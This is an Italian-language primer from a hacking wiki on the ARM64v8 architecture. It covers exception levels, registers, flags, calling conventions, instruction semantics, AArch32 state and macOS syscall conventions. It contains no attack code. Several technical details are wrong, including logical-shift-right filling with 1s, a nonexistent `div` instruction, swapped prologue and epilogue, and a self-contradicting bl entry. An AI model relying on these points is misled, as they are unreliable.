# Introduzione all'ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Livelli di Eccezione - EL (ARM64v8)**

Nell'architettura ARMv8, i livelli di esecuzione, noti come Livelli di Eccezione (EL), definiscono il livello di privilegio e le capacità dell'ambiente di esecuzione. Ci sono quattro livelli di eccezione, che vanno da EL0 a EL3, ognuno con uno scopo diverso:

1. **EL0 - Modalità Utente**:
- Questo è il livello meno privilegiato ed è utilizzato per eseguire codice di applicazione regolare.
- Le applicazioni in esecuzione a EL0 sono isolate l'una dall'altra e dal software di sistema, migliorando la sicurezza e la stabilità.
2. **EL1 - Modalità Kernel del Sistema Operativo**:
- La maggior parte dei kernel dei sistemi operativi gira a questo livello.
- EL1 ha più privilegi di EL0 e può accedere alle risorse di sistema, ma con alcune restrizioni per garantire l'integrità del sistema.
3. **EL2 - Modalità Hypervisor**:
- Questo livello è utilizzato per la virtualizzazione. Un hypervisor in esecuzione a EL2 può gestire più sistemi operativi (ciascuno nel proprio EL1) in esecuzione sullo stesso hardware fisico.
- EL2 fornisce funzionalità per l'isolamento e il controllo degli ambienti virtualizzati.
4. **EL3 - Modalità Monitor Sicuro**:
- Questo è il livello più privilegiato ed è spesso utilizzato per l'avvio sicuro e gli ambienti di esecuzione fidati.
- EL3 può gestire e controllare gli accessi tra stati sicuri e non sicuri (come l'avvio sicuro, OS fidato, ecc.).

L'uso di questi livelli consente un modo strutturato e sicuro per gestire diversi aspetti del sistema, dalle applicazioni utente al software di sistema più privilegiato. L'approccio di ARMv8 ai livelli di privilegio aiuta a isolare efficacemente i diversi componenti del sistema, migliorando così la sicurezza e la robustezza del sistema.

## **Registri (ARM64v8)**

ARM64 ha **31 registri a uso generale**, etichettati da `x0` a `x30`. Ognuno può memorizzare un valore **a 64 bit** (8 byte). Per le operazioni che richiedono solo valori a 32 bit, gli stessi registri possono essere accessibili in modalità a 32 bit utilizzando i nomi w0 a w30.

1. **`x0`** a **`x7`** - Questi sono tipicamente utilizzati come registri temporanei e per passare parametri a sottoprogrammi.
- **`x0`** porta anche i dati di ritorno di una funzione.
2. **`x8`** - Nel kernel Linux, `x8` è utilizzato come numero di chiamata di sistema per l'istruzione `svc`. **In macOS è `x16` quello utilizzato!**
3. **`x9`** a **`x15`** - Altri registri temporanei, spesso utilizzati per variabili locali.
4. **`x16`** e **`x17`** - **Registri di Chiamata Intra-procedurale**. Registri temporanei per valori immediati. Sono anche utilizzati per chiamate di funzione indirette e stub della PLT (Procedure Linkage Table).
- **`x16`** è utilizzato come **numero di chiamata di sistema** per l'istruzione **`svc`** in **macOS**.
5. **`x18`** - **Registro di Piattaforma**. Può essere utilizzato come registro a uso generale, ma su alcune piattaforme, questo registro è riservato per usi specifici della piattaforma: Puntatore al blocco di ambiente del thread corrente in Windows, o per puntare alla struttura del **compito in esecuzione nel kernel linux**.
6. **`x19`** a **`x28`** - Questi sono registri salvati dal chiamato. Una funzione deve preservare i valori di questi registri per il suo chiamante, quindi vengono memorizzati nello stack e recuperati prima di tornare al chiamante.
7. **`x29`** - **Puntatore di Frame** per tenere traccia del frame dello stack. Quando viene creato un nuovo frame dello stack a causa di una chiamata di funzione, il registro **`x29`** è **memorizzato nello stack** e l'indirizzo del **nuovo** puntatore di frame è (**indirizzo `sp`**) **memorizzato in questo registro**.
- Questo registro può anche essere utilizzato come un **registro a uso generale** anche se di solito è usato come riferimento a **variabili locali**.
8. **`x30`** o **`lr`** - **Registro di Link**. Tiene l'**indirizzo di ritorno** quando viene eseguita un'istruzione `BL` (Branch with Link) o `BLR` (Branch with Link to Register) memorizzando il valore **`pc`** in questo registro.
- Può anche essere utilizzato come qualsiasi altro registro.
- Se la funzione corrente sta per chiamare una nuova funzione e quindi sovrascrivere `lr`, lo memorizzerà nello stack all'inizio, questo è l'epilogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Memorizza `fp` e `lr`, genera spazio e ottiene un nuovo `fp`) e lo recupera alla fine, questo è il prologo (`ldp x29, x30, [sp], #48; ret` -> Recupera `fp` e `lr` e ritorna).
9. **`sp`** - **Puntatore di Stack**, utilizzato per tenere traccia della parte superiore dello stack.
- il valore **`sp`** dovrebbe sempre essere mantenuto almeno a un **allineamento** **quadword** o potrebbe verificarsi un'eccezione di allineamento.
10. **`pc`** - **Contatore di Programma**, che punta alla prossima istruzione. Questo registro può essere aggiornato solo attraverso generazioni di eccezione, ritorni di eccezione e salti. Le uniche istruzioni ordinarie che possono leggere questo registro sono le istruzioni di salto con link (BL, BLR) per memorizzare l'indirizzo **`pc`** in **`lr`** (Link Register).
11. **`xzr`** - **Registro Zero**. Chiamato anche **`wzr`** nella sua forma di registro **a 32** bit. Può essere utilizzato per ottenere facilmente il valore zero (operazione comune) o per eseguire confronti utilizzando **`subs`** come **`subs XZR, Xn, #10`** memorizzando i dati risultanti da nessuna parte (in **`xzr`**).

I registri **`Wn`** sono la versione **a 32 bit** del registro **`Xn`**.

### Registri SIMD e a Punto Fisso

Inoltre, ci sono altri **32 registri di lunghezza 128 bit** che possono essere utilizzati in operazioni ottimizzate di dati a istruzione singola multipla (SIMD) e per eseguire aritmetica a punto fisso. Questi sono chiamati registri Vn anche se possono operare anche in **64** bit, **32** bit, **16** bit e **8** bit e poi sono chiamati **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.

### Registri di Sistema

**Ci sono centinaia di registri di sistema**, chiamati anche registri a scopo speciale (SPRs), utilizzati per **monitorare** e **controllare** il comportamento dei **processori**.\
Possono essere letti o impostati solo utilizzando le istruzioni speciali dedicate **`mrs`** e **`msr`**.

I registri speciali **`TPIDR_EL0`** e **`TPIDDR_EL0`** si trovano comunemente durante il reverse engineering. Il suffisso `EL0` indica l'**eccezione minima** da cui il registro può essere accessibile (in questo caso EL0 è il livello di eccezione (privilegio) regolare con cui i programmi normali vengono eseguiti).\
Sono spesso utilizzati per memorizzare l'**indirizzo base della regione di memoria di storage locale per thread**. Di solito il primo è leggibile e scrivibile per i programmi in esecuzione a EL0, ma il secondo può essere letto da EL0 e scritto da EL1 (come il kernel).

- `mrs x0, TPIDR_EL0 ; Leggi TPIDR_EL0 in x0`
- `msr TPIDR_EL0, X0 ; Scrivi x0 in TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene diversi componenti del processo serializzati nel registro speciale visibile dal sistema operativo **`SPSR_ELx`**, dove X è il **livello di autorizzazione** **dell'eccezione** attivata (questo consente di recuperare lo stato del processo quando l'eccezione termina).\
Questi sono i campi accessibili:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- I flag di condizione **`N`**, **`Z`**, **`C`** e **`V`**:
- **`N`** significa che l'operazione ha prodotto un risultato negativo.
- **`Z`** significa che l'operazione ha prodotto zero.
- **`C`** significa che l'operazione ha portato.
- **`V`** significa che l'operazione ha prodotto un overflow firmato:
- La somma di due numeri positivi produce un risultato negativo.
- La somma di due numeri negativi produce un risultato positivo.
- Nella sottrazione, quando un grande numero negativo viene sottratto da un numero positivo più piccolo (o viceversa), e il risultato non può essere rappresentato nell'intervallo della dimensione di bit data.
- Ovviamente il processore non sa se l'operazione è firmata o meno, quindi controllerà C e V nelle operazioni e indicherà se si è verificato un riporto nel caso fosse firmato o non firmato.

> [!WARNING]
> Non tutte le istruzioni aggiornano questi flag. Alcune come **`CMP`** o **`TST`** lo fanno, e altre che hanno un suffisso s come **`ADDS`** lo fanno anche.

- Il flag di **larghezza del registro corrente (`nRW`)**: Se il flag ha il valore 0, il programma verrà eseguito nello stato di esecuzione AArch64 una volta ripreso.
- Il **livello di eccezione corrente** (**`EL`**): Un programma regolare in esecuzione a EL0 avrà il valore 0.
- Il flag di **single stepping** (**`SS`**): Utilizzato dai debugger per eseguire un passo singolo impostando il flag SS a 1 all'interno di **`SPSR_ELx`** attraverso un'eccezione. Il programma eseguirà un passo e genererà un'eccezione di passo singolo.
- Il flag di stato di **eccezione illegale** (**`IL`**): Viene utilizzato per contrassegnare quando un software privilegiato esegue un trasferimento di livello di eccezione non valido, questo flag è impostato a 1 e il processore attiva un'eccezione di stato illegale.
- I flag **`DAIF`**: Questi flag consentono a un programma privilegiato di mascherare selettivamente alcune eccezioni esterne.
- Se **`A`** è 1 significa che verranno attivati **aborti asincroni**. Il **`I`** configura la risposta alle **Richieste di Interruzione Hardware** (IRQ). e il F è relativo alle **Richieste di Interruzione Veloce** (FIR).
- I flag di selezione del puntatore di stack (**`SPS`**): I programmi privilegiati in esecuzione a EL1 e superiori possono passare dall'utilizzo del proprio registro di puntatore di stack a quello del modello utente (ad es. tra `SP_EL1` e `EL0`). Questo passaggio viene eseguito scrivendo nel registro speciale **`SPSel`**. Questo non può essere fatto da EL0.

## **Convenzione di Chiamata (ARM64v8)**

La convenzione di chiamata ARM64 specifica che i **primi otto parametri** a una funzione vengono passati nei registri **`x0`** a **`x7`**. I parametri **aggiuntivi** vengono passati nello **stack**. Il **valore di ritorno** viene restituito nel registro **`x0`**, o in **`x1`** se è lungo **128 bit**. I registri **`x19`** a **`x30`** e **`sp`** devono essere **preservati** tra le chiamate di funzione.

Quando si legge una funzione in assembly, cercare il **prologo e l'epilogo** della funzione. Il **prologo** di solito comporta **salvare il puntatore di frame (`x29`)**, **impostare** un **nuovo puntatore di frame**, e **allocare spazio nello stack**. L'**epilogo** di solito comporta **ripristinare il puntatore di frame salvato** e **ritornare** dalla funzione.

### Convenzione di Chiamata in Swift

Swift ha la propria **convenzione di chiamata** che può essere trovata in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Istruzioni Comuni (ARM64v8)**

Le istruzioni ARM64 generalmente hanno il **formato `opcode dst, src1, src2`**, dove **`opcode`** è l'**operazione** da eseguire (come `add`, `sub`, `mov`, ecc.), **`dst`** è il **registro di destinazione** dove verrà memorizzato il risultato, e **`src1`** e **`src2`** sono i **registri sorgente**. I valori immediati possono anche essere utilizzati al posto dei registri sorgente.

- **`mov`**: **Sposta** un valore da un **registro** a un altro.
- Esempio: `mov x0, x1` — Questo sposta il valore da `x1` a `x0`.
- **`ldr`**: **Carica** un valore dalla **memoria** in un **registro**.
- Esempio: `ldr x0, [x1]` — Questo carica un valore dalla posizione di memoria puntata da `x1` in `x0`.
- **Modalità Offset**: Un offset che influisce sul puntatore originale è indicato, ad esempio:
- `ldr x2, [x1, #8]`, questo caricherà in x2 il valore da x1 + 8.
- `ldr x2, [x0, x1, lsl #2]`, questo caricherà in x2 un oggetto dall'array x0, dalla posizione x1 (indice) \* 4.
- **Modalità Pre-indicizzata**: Questo applicherà calcoli all'origine, otterrà il risultato e memorizzerà anche la nuova origine nell'origine.
- `ldr x2, [x1, #8]!`, questo caricherà `x1 + 8` in `x2` e memorizzerà in x1 il risultato di `x1 + 8`.
- `str lr, [sp, #-4]!`, Memorizza il registro di link in sp e aggiorna il registro sp.
- **Modalità Post-indicizzata**: Questo è simile al precedente ma l'indirizzo di memoria viene accesso e poi l'offset viene calcolato e memorizzato.
- `ldr x0, [x1], #8`, carica `x1` in `x0` e aggiorna x1 con `x1 + 8`.
- **Indirizzamento relativo al PC**: In questo caso l'indirizzo da caricare è calcolato rispetto al registro PC.
- `ldr x1, =_start`, Questo caricherà l'indirizzo dove inizia il simbolo `_start` in x1 relativo all'attuale PC.
- **`str`**: **Memorizza** un valore da un **registro** nella **memoria**.
- Esempio: `str x0, [x1]` — Questo memorizza il valore in `x0` nella posizione di memoria puntata da `x1`.
- **`ldp`**: **Carica una coppia di registri**. Questa istruzione **carica due registri** da **posizioni di memoria** consecutive. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
- Esempio: `ldp x0, x1, [x2]` — Questo carica `x0` e `x1` dalle posizioni di memoria in `x2` e `x2 + 8`, rispettivamente.
- **`stp`**: **Memorizza una coppia di registri**. Questa istruzione **memorizza due registri** in **posizioni di memoria** consecutive. L'indirizzo di memoria è tipicamente formato aggiungendo un offset al valore in un altro registro.
- Esempio: `stp x0, x1, [sp]` — Questo memorizza `x0` e `x1` nelle posizioni di memoria in `sp` e `sp + 8`, rispettivamente.
- `stp x0, x1, [sp, #16]!` — Questo memorizza `x0` e `x1` nelle posizioni di memoria in `sp+16` e `sp + 24`, rispettivamente, e aggiorna `sp` con `sp+16`.
- **`add`**: **Aggiunge** i valori di due registri e memorizza il risultato in un registro.
- Sintassi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destinazione
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registro o immediato)
- \[shift #N | RRX] -> Esegui uno shift o chiama RRX.
- Esempio: `add x0, x1, x2` — Questo aggiunge i valori in `x1` e `x2` insieme e memorizza il risultato in `x0`.
- `add x5, x5, #1, lsl #12` — Questo equivale a 4096 (un 1 shifter 12 volte) -> 1 0000 0000 0000 0000.
- **`adds`** Questo esegue un `add` e aggiorna i flag.
- **`sub`**: **Sottrae** i valori di due registri e memorizza il risultato in un registro.
- Controlla la **sintassi di `add`**.
- Esempio: `sub x0, x1, x2` — Questo sottrae il valore in `x2` da `x1` e memorizza il risultato in `x0`.
- **`subs`** Questo è simile a sub ma aggiorna il flag.
- **`mul`**: **Moltiplica** i valori di **due registri** e memorizza il risultato in un registro.
- Esempio: `mul x0, x1, x2` — Questo moltiplica i valori in `x1` e `x2` e memorizza il risultato in `x0`.
- **`div`**: **Divide** il valore di un registro per un altro e memorizza il risultato in un registro.
- Esempio: `div x0, x1, x2` — Questo divide il valore in `x1` per `x2` e memorizza il risultato in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Shift logico a sinistra**: Aggiungi 0s dalla fine spostando gli altri bit in avanti (moltiplica per n volte 2).
- **Shift logico a destra**: Aggiungi 1s all'inizio spostando gli altri bit all'indietro (dividi per n volte 2 in modo non firmato).
- **Shift aritmetico a destra**: Come **`lsr`**, ma invece di aggiungere 0s se il bit più significativo è 1, **si aggiungono 1s** (**dividi per n volte 2 in modo firmato**).
- **Ruota a destra**: Come **`lsr`** ma qualsiasi cosa venga rimossa da destra viene aggiunta a sinistra.
- **Ruota a destra con estensione**: Come **`ror`**, ma con il flag di riporto come "bit più significativo". Quindi il flag di riporto viene spostato al bit 31 e il bit rimosso al flag di riporto.
- **`bfm`**: **Bit Field Move**, queste operazioni **copia i bit `0...n`** da un valore e li posiziona nelle posizioni **`m..m+n`**. Il **`#s`** specifica la **posizione del bit più a sinistra** e **`#r`** la **quantità di rotazione a destra**.
- Spostamento di campo bit: `BFM Xd, Xn, #r`.
- Spostamento di campo firmato: `SBFM Xd, Xn, #r, #s`.
- Spostamento di campo non firmato: `UBFM Xd, Xn, #r, #s`.
- **Estrazione e Inserimento di Campo Bit:** Copia un campo bit da un registro e lo copia in un altro registro.
- **`BFI X1, X2, #3, #4`** Inserisce 4 bit da X2 dal 3° bit di X1.
- **`BFXIL X1, X2, #3, #4`** Estrae dal 3° bit di X2 quattro bit e li copia in X1.
- **`SBFIZ X1, X2, #3, #4`** Estende il segno di 4 bit da X2 e li inserisce in X1 a partire dalla posizione del bit 3 azzerando i bit a destra.
- **`SBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 di X2, estende il segno e posiziona il risultato in X1.
- **`UBFIZ X1, X2, #3, #4`** Estende a zero 4 bit da X2 e li inserisce in X1 a partire dalla posizione del bit 3 azzerando i bit a destra.
- **`UBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 di X2 e posiziona il risultato esteso a zero in X1.
- **Estensione del Segno a X:** Estende il segno (o aggiunge solo 0s nella versione non firmata) di un valore per poter eseguire operazioni con esso:
- **`SXTB X1, W2`** Estende il segno di un byte **da W2 a X1** (`W2` è la metà di `X2`) per riempire i 64 bit.
- **`SXTH X1, W2`** Estende il segno di un numero a 16 bit **da W2 a X1** per riempire i 64 bit.
- **`SXTW X1, W2`** Estende il segno di un byte **da W2 a X1** per riempire i 64 bit.
- **`UXTB X1, W2`** Aggiunge 0s (non firmato) a un byte **da W2 a X1** per riempire i 64 bit.
- **`extr`:** Estrae bit da una **coppia di registri specificata concatenata**.
- Esempio: `EXTR W3, W2, W1, #3` Questo **concatenerà W1+W2** e otterrà **dal bit 3 di W2 fino al bit 3 di W1** e lo memorizzerà in W3.
- **`cmp`**: **Confronta** due registri e imposta i flag di condizione. È un **alias di `subs`** impostando il registro di destinazione al registro zero. Utile per sapere se `m == n`.
- Supporta la **stessa sintassi di `subs`**.
- Esempio: `cmp x0, x1` — Questo confronta i valori in `x0` e `x1` e imposta i flag di condizione di conseguenza.
- **`cmn`**: **Confronta l'operando negativo**. In questo caso è un **alias di `adds`** e supporta la stessa sintassi. Utile per sapere se `m == -n`.
- **`ccmp`**: Confronto condizionale, è un confronto che verrà eseguito solo se un confronto precedente è stato vero e imposterà specificamente i bit nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, salta a func.
- Questo perché **`ccmp`** verrà eseguito solo se il **precedente `cmp` era un `NE`**, se non lo era i bit `nzcv` saranno impostati a 0 (il che non soddisferà il confronto `blt`).
- Questo può anche essere usato come `ccmn` (stessa cosa ma negativa, come `cmp` vs `cmn`).
- **`tst`**: Controlla se uno dei valori del confronto è entrambi 1 (funziona come un ANDS senza memorizzare il risultato da nessuna parte). È utile per controllare un registro con un valore e verificare se uno dei bit del registro indicato nel valore è 1.
- Esempio: `tst X1, #7` Controlla se uno degli ultimi 3 bit di X1 è 1.
- **`teq`**: Operazione XOR scartando il risultato.
- **`b`**: Salto incondizionato.
- Esempio: `b myFunction`.
- Nota che questo non riempirà il registro di link con l'indirizzo di ritorno (non adatto per chiamate a sottoprogrammi che devono tornare indietro).
- **`bl`**: **Salto** con link, utilizzato per **chiamare** un **sottoprogramma**. Memorizza l'**indirizzo di ritorno in `x30`**.
- Esempio: `bl myFunction` — Questo chiama la funzione `myFunction` e memorizza l'indirizzo di ritorno in `x30`.
- Nota che questo non riempirà il registro di link con l'indirizzo di ritorno (non adatto per chiamate a sottoprogrammi che devono tornare indietro).
- **`blr`**: **Salto** con Link a Registro, utilizzato per **chiamare** un **sottoprogramma** dove il target è **specificato** in un **registro**. Memorizza l'indirizzo di ritorno in `x30`.
- Esempio: `blr x1` — Questo chiama la funzione il cui indirizzo è contenuto in `x1` e memorizza l'indirizzo di ritorno in `x30`.
- **`ret`**: **Ritorna** dal **sottoprogramma**, tipicamente utilizzando l'indirizzo in **`x30`**.
- Esempio: `ret` — Questo ritorna dal sottoprogramma corrente utilizzando l'indirizzo di ritorno in `x30`.
- **`b.<cond>`**: Salti condizionali.
- **`b.eq`**: **Salta se uguale**, basato sull'istruzione `cmp` precedente.
- Esempio: `b.eq label` — Se l'istruzione `cmp` precedente ha trovato due valori uguali, questo salta a `label`.
- **`b.ne`**: **Salta se non uguale**. Questa istruzione controlla i flag di condizione (che sono stati impostati da un'istruzione di confronto precedente), e se i valori confrontati non erano uguali, salta a un'etichetta o indirizzo.
- Esempio: Dopo un'istruzione `cmp x0, x1`, `b.ne label` — Se i valori in `x0` e `x1` non erano uguali, questo salta a `label`.
- **`cbz`**: **Confronta e Salta su Zero**. Questa istruzione confronta un registro con zero, e se sono uguali, salta a un'etichetta o indirizzo.
- Esempio: `cbz x0, label` — Se il valore in `x0` è zero, questo salta a `label`.
- **`cbnz`**: **Confronta e Salta su Non Zero**. Questa istruzione confronta un registro con zero, e se non sono uguali, salta a un'etichetta o indirizzo.
- Esempio: `cbnz x0, label` — Se il valore in `x0` è diverso da zero, questo salta a `label`.
- **`tbnz`**: Testa il bit e salta se non zero.
- Esempio: `tbnz x0, #8, label`.
- **`tbz`**: Testa il bit e salta se zero.
- Esempio: `tbz x0, #8, label`.
- **Operazioni di selezione condizionale**: Queste sono operazioni il cui comportamento varia a seconda dei bit condizionali.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Se vero, X0 = X1, se falso, X0 = X2.
- `csinc Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = Xm + 1.
- `cinc Xd, Xn, cond` -> Se vero, Xd = Xn + 1, se falso, Xd = Xn.
- `csinv Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = NOT(Xm).
- `cinv Xd, Xn, cond` -> Se vero, Xd = NOT(Xn), se falso, Xd = Xn.
- `csneg Xd, Xn, Xm, cond` -> Se vero, Xd = Xn, se falso, Xd = - Xm.
- `cneg Xd, Xn, cond` -> Se vero, Xd = - Xn, se falso, Xd = Xn.
- `cset Xd, Xn, Xm, cond` -> Se vero, Xd = 1, se falso, Xd = 0.
- `csetm Xd, Xn, Xm, cond` -> Se vero, Xd = \<tutti 1>, se falso, Xd = 0.
- **`adrp`**: Calcola l'**indirizzo della pagina di un simbolo** e lo memorizza in un registro.
- Esempio: `adrp x0, symbol` — Questo calcola l'indirizzo della pagina di `symbol` e lo memorizza in `x0`.
- **`ldrsw`**: **Carica** un valore **firmato a 32 bit** dalla memoria e **estende il segno a 64** bit.
- Esempio: `ldrsw x0, [x1]` — Questo carica un valore firmato a 32 bit dalla posizione di memoria puntata da `x1`, estende il segno a 64 bit e lo memorizza in `x0`.
- **`stur`**: **Memorizza un valore di registro in una posizione di memoria**, utilizzando un offset da un altro registro.
- Esempio: `stur x0, [x1, #4]` — Questo memorizza il valore in `x0` nell'indirizzo di memoria che è 4 byte maggiore dell'indirizzo attualmente in `x1`.
- **`svc`** : Effettua una **chiamata di sistema**. Sta per "Supervisor Call". Quando il processore esegue questa istruzione, **passa dalla modalità utente alla modalità kernel** e salta a una posizione specifica in memoria dove si trova il **codice di gestione delle chiamate di sistema del kernel**.

- Esempio:

```armasm
mov x8, 93  ; Carica il numero di chiamata di sistema per l'uscita (93) nel registro x8.
mov x0, 0   ; Carica il codice di stato di uscita (0) nel registro x0.
svc 0       ; Effettua la chiamata di sistema.
```

### **Prologo della Funzione**

1. **Salva il registro di link e il puntatore di frame nello stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Imposta il nuovo puntatore di frame**: `mov x29, sp` (imposta il nuovo puntatore di frame per la funzione corrente)  
3. **Alloca spazio nello stack per le variabili locali** (se necessario): `sub sp, sp, <size>` (dove `<size>` è il numero di byte necessari)  

### **Epilogo della Funzione**

1. **Dealloca le variabili locali (se ne erano state allocate)**: `add sp, sp, <size>`  
2. **Ripristina il registro di collegamento e il puntatore di frame**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (restituisce il controllo al chiamante utilizzando l'indirizzo nel registro di collegamento)

## Stato di Esecuzione AARCH32

Armv8-A supporta l'esecuzione di programmi a 32 bit. **AArch32** può funzionare in uno dei **due set di istruzioni**: **`A32`** e **`T32`** e può passare da uno all'altro tramite **`interworking`**.\
I programmi **privilegiati** a 64 bit possono pianificare l'**esecuzione di programmi a 32 bit** eseguendo un trasferimento di livello di eccezione al 32 bit meno privilegiato.\
Si noti che la transizione da 64 bit a 32 bit avviene con una diminuzione del livello di eccezione (ad esempio, un programma a 64 bit in EL1 che attiva un programma in EL0). Questo avviene impostando il **bit 4 di** **`SPSR_ELx`** registro speciale **a 1** quando il thread di processo `AArch32` è pronto per essere eseguito e il resto di `SPSR_ELx` memorizza il **CPSR** dei programmi **`AArch32`**. Poi, il processo privilegiato chiama l'istruzione **`ERET`** affinché il processore transiti a **`AArch32`** entrando in A32 o T32 a seconda del CPSR\*\*.\*\*

L'**`interworking`** avviene utilizzando i bit J e T del CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Questo si traduce fondamentalmente nell'impostare il **bit più basso a 1** per indicare che il set di istruzioni è T32.\
Questo viene impostato durante le **istruzioni di salto interworking**, ma può anche essere impostato direttamente con altre istruzioni quando il PC è impostato come registro di destinazione. Esempio:

Un altro esempio:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Ci sono 16 registri a 32 bit (r0-r15). **Da r0 a r14** possono essere utilizzati per **qualsiasi operazione**, tuttavia alcuni di essi sono solitamente riservati:

- **`r15`**: Contatore del programma (sempre). Contiene l'indirizzo della prossima istruzione. In A32 corrente + 8, in T32, corrente + 4.
- **`r11`**: Puntatore del frame
- **`r12`**: Registro di chiamata intra-procedurale
- **`r13`**: Puntatore dello stack
- **`r14`**: Registro di collegamento

Inoltre, i registri sono salvati in **`registri bancari`**. Questi sono luoghi che memorizzano i valori dei registri consentendo di eseguire **veloci cambi di contesto** nella gestione delle eccezioni e nelle operazioni privilegiate per evitare la necessità di salvare e ripristinare manualmente i registri ogni volta.\
Questo avviene **salvando lo stato del processore da `CPSR` a `SPSR`** della modalità del processore a cui viene presa l'eccezione. Al ritorno dall'eccezione, il **`CPSR`** viene ripristinato dal **`SPSR`**.

### CPSR - Registro di Stato del Programma Corrente

In AArch32 il CPSR funziona in modo simile a **`PSTATE`** in AArch64 ed è anche memorizzato in **`SPSR_ELx`** quando viene presa un'eccezione per ripristinare successivamente l'esecuzione:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

I campi sono divisi in alcuni gruppi:

- Registro di Stato del Programma Applicativo (APSR): Flag aritmetici e accessibili da EL0
- Registri di Stato di Esecuzione: Comportamento del processo (gestito dal sistema operativo).

#### Registro di Stato del Programma Applicativo (APSR)

- I flag **`N`**, **`Z`**, **`C`**, **`V`** (proprio come in AArch64)
- Il flag **`Q`**: Viene impostato a 1 ogni volta che **si verifica una saturazione intera** durante l'esecuzione di un'istruzione aritmetica specializzata di saturazione. Una volta impostato a **`1`**, manterrà il valore fino a quando non verrà impostato manualmente a 0. Inoltre, non esiste alcuna istruzione che controlli il suo valore implicitamente, deve essere fatto leggendo manualmente.
- Flag **`GE`** (Maggiore o uguale): Viene utilizzato nelle operazioni SIMD (Single Instruction, Multiple Data), come "somma parallela" e "sottrazione parallela". Queste operazioni consentono di elaborare più punti dati in un'unica istruzione.

Ad esempio, l'istruzione **`UADD8`** **somma quattro coppie di byte** (da due operandi a 32 bit) in parallelo e memorizza i risultati in un registro a 32 bit. Imposta quindi **i flag `GE` nell'`APSR`** in base a questi risultati. Ogni flag GE corrisponde a una delle somme di byte, indicando se la somma per quella coppia di byte **è traboccata**.

L'istruzione **`SEL`** utilizza questi flag GE per eseguire azioni condizionali.

#### Registri di Stato di Esecuzione

- I bit **`J`** e **`T`**: **`J`** dovrebbe essere 0 e se **`T`** è 0 viene utilizzato il set di istruzioni A32, e se è 1, viene utilizzato il T32.
- **Registro di Stato del Blocco IT** (`ITSTATE`): Questi sono i bit da 10-15 e 25-26. Memorizzano le condizioni per le istruzioni all'interno di un gruppo con prefisso **`IT`**.
- Bit **`E`**: Indica l'**endianness**.
- Bit di Maschera di Modalità ed Eccezione (0-4): Determinano lo stato di esecuzione corrente. Il **5°** indica se il programma viene eseguito come 32 bit (un 1) o 64 bit (uno 0). Gli altri 4 rappresentano la **modalità di eccezione attualmente in uso** (quando si verifica un'eccezione e viene gestita). Il numero impostato **indica la priorità corrente** nel caso venga attivata un'altra eccezione mentre questa viene gestita.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Alcune eccezioni possono essere disabilitate utilizzando i bit **`A`**, `I`, `F`. Se **`A`** è 1 significa che verranno attivati **aborti asincroni**. Il **`I`** configura per rispondere alle **Richieste di Interruzione** hardware esterne (IRQ). e il F è relativo alle **Richieste di Interruzione Veloce** (FIR).

## macOS

### Chiamate di sistema BSD

Controlla [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Le chiamate di sistema BSD avranno **x16 > 0**.

### Trappole Mach

Controlla in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) la `mach_trap_table` e in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) i prototipi. Il numero massimo di trappole Mach è `MACH_TRAP_TABLE_COUNT` = 128. Le trappole Mach avranno **x16 < 0**, quindi devi chiamare i numeri dall'elenco precedente con un **meno**: **`_kernelrpc_mach_vm_allocate_trap`** è **`-10`**.

Puoi anche controllare **`libsystem_kernel.dylib`** in un disassemblatore per trovare come chiamare queste (e BSD) chiamate di sistema:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Nota che **Ida** e **Ghidra** possono anche decompilare **dylibs specifici** dalla cache semplicemente passando la cache.

> [!TIP]
> A volte è più facile controllare il codice **decompilato** di **`libsystem_kernel.dylib`** **che** controllare il **codice sorgente** perché il codice di diverse syscalls (BSD e Mach) è generato tramite script (controlla i commenti nel codice sorgente) mentre nella dylib puoi trovare cosa viene chiamato.

### chiamate machdep

XNU supporta un altro tipo di chiamate chiamate dipendenti dalla macchina. I numeri di queste chiamate dipendono dall'architettura e né le chiamate né i numeri sono garantiti per rimanere costanti.

### pagina comm

Questa è una pagina di memoria di proprietà del kernel che è mappata nello spazio degli indirizzi di ogni processo utente. È progettata per rendere la transizione dalla modalità utente allo spazio kernel più veloce rispetto all'uso di syscalls per i servizi del kernel che vengono utilizzati così tanto che questa transizione sarebbe molto inefficiente.

